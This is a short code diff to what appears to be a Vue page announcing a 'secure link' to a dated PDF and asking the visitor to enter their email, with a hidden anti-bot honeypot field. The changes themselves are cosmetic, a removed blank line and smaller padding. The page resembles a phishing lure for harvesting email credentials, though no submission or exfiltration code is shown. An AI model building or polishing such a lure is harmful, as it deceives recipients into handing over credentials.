@@ -21,7 +21,6 @@
         <p>You've received a secure link to:</p>
         <p style="font-size: 16px;">AA484937-13-06-2025.pdf</p>
         <p style="font-size: 16px;">To proceed, enter the email that this <br>item was shared to</p>
-
         <div class="form-wrapper">
           <label for="honeypot" class="visually-hidden">Do not fill this field (anti-bot)</label>
           <input id="honeypot" v-model="honeypot" type="text" tabindex="-1" autocomplete="off" aria-hidden="true" class="visually-hidden" />
@@ -197,7 +196,7 @@ html, body {
   background: #ffffff;
   border-radius: 10px;
   box-shadow: 0 2px 16px rgba(0, 0, 0, 0.1);
-  padding: 2rem;
+  padding: 1rem;
   display: flex;
   flex-direction: column;
   justify-content: center;
